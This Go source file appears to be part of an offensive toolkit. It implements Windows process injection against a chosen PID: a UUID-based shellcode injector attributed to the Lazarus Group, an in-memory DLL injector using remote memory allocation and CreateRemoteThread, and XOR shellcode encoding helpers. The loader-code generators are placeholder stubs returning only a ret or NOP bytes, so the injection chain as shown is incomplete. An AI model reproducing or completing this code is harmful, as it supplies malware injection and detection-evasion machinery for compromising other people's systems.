package injection

import (
	"encoding/hex"
	"fmt"
	"strings"
)

type UUIDInjector struct {
	BaseInjector
}

func NewUUIDInjector() *UUIDInjector {
	return &UUIDInjector{
		BaseInjector: BaseInjector{
			name:        "UUIDInjection",
			description: "Process injection using UUIDs to store and execute shellcode (used by Lazarus Group)",
		},
	}
}

func (i *UUIDInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	uuids, err := shellcodeToUUIDs(shellcode)
	if err != nil {
		return fmt.Errorf("failed to convert shellcode to UUIDs: %v", err)
	}

	
	uuidArraySize := SIZE_T(len(uuids) * 16) 
	uuidArrayAddr, err := VirtualAllocEx(hProcess, 0, uuidArraySize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory for UUID array: %v", err)
	}

	
	for i, uuid := range uuids {
		err = WriteProcessMemory(hProcess, LPVOID(uintptr(uuidArrayAddr)+uintptr(i*16)), uuid, 16)
		if err != nil {
			virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
			return fmt.Errorf("failed to write UUID: %v", err)
		}
	}

	
	loaderCode := generateUUIDLoaderCode(uuidArrayAddr, DWORD(len(uuids)))
	loaderCodeAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(loaderCode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to allocate memory for loader code: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, loaderCodeAddr, loaderCode, SIZE_T(len(loaderCode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write loader code: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, loaderCodeAddr, SIZE_T(len(loaderCode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	hThread, err := CreateRemoteThread(hProcess, 0, 0, loaderCodeAddr, 0, 0)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	
	WaitForSingleObject(hThread, INFINITE)

	
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

func shellcodeToUUIDs(shellcode []byte) ([][]byte, error) {
	
	paddedSize := (len(shellcode) + 15) & ^15
	paddedShellcode := make([]byte, paddedSize)
	copy(paddedShellcode, shellcode)

	
	var uuids [][]byte
	for i := 0; i < len(paddedShellcode); i += 16 {
		uuid := make([]byte, 16)
		copy(uuid, paddedShellcode[i:i+16])
		uuids = append(uuids, uuid)
	}

	return uuids, nil
}

func generateUUIDLoaderCode(uuidArrayAddr LPVOID, uuidCount DWORD) []byte {
	
	
	

	
	return []byte{0xC3} 
}

type MemoryModuleInjector struct {
	BaseInjector
}

func NewMemoryModuleInjector() *MemoryModuleInjector {
	return &MemoryModuleInjector{
		BaseInjector: BaseInjector{
			name:        "MemoryModule",
			description: "Process injection by loading a DLL directly from memory",
		},
	}
}

func (i *MemoryModuleInjector) Inject(pid int, dllBytes []byte) error {
	
	if len(dllBytes) == 0 {
		return fmt.Errorf("DLL data is empty")
	}

	
	if !isPEFile(dllBytes) {
		return fmt.Errorf("not a valid PE file")
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	dllAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(dllBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory for DLL: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, dllAddr, dllBytes, SIZE_T(len(dllBytes)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write DLL: %v", err)
	}

	
	loaderCode := generateMemoryModuleLoaderCode(dllAddr)
	loaderCodeAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(loaderCode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to allocate memory for loader code: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, loaderCodeAddr, loaderCode, SIZE_T(len(loaderCode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write loader code: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, loaderCodeAddr, SIZE_T(len(loaderCode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	hThread, err := CreateRemoteThread(hProcess, 0, 0, loaderCodeAddr, dllAddr, 0)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	
	WaitForSingleObject(hThread, INFINITE)

	
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

func isPEFile(data []byte) bool {
	
	if len(data) < 2 || data[0] != 'M' || data[1] != 'Z' {
		return false
	}
	return true
}

func generateMemoryModuleLoaderCode(dllAddr LPVOID) []byte {
	
	
	

	
	return []byte{0xC3} 
}

type ShellcodeUtils struct{}

func NewShellcodeUtils() *ShellcodeUtils {
	return &ShellcodeUtils{}
}

func (s *ShellcodeUtils) HexToShellcode(hexStr string) ([]byte, error) {
	
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\t", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	hexStr = strings.ReplaceAll(hexStr, "0x", "")
	hexStr = strings.ReplaceAll(hexStr, "\\x", "")

	
	shellcode, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, fmt.Errorf("failed to decode hex string: %v", err)
	}

	return shellcode, nil
}

func (s *ShellcodeUtils) EncodeShellcode(shellcode []byte, key byte) []byte {
	encoded := make([]byte, len(shellcode))
	for i, b := range shellcode {
		encoded[i] = b ^ key
	}
	return encoded
}

func (s *ShellcodeUtils) DecodeShellcode(encoded []byte, key byte) []byte {
	
	return s.EncodeShellcode(encoded, key)
}

func (s *ShellcodeUtils) GenerateShellcodeLoader(shellcode []byte, technique string) ([]byte, error) {
	
	

	switch technique {
	case "createthread":
		return []byte{0x90, 0x90, 0x90, 0xC3}, nil 
	case "apc":
		return []byte{0x90, 0x90, 0x90, 0xC3}, nil 
	default:
		return nil, fmt.Errorf("unsupported technique: %s", technique)
	}
}
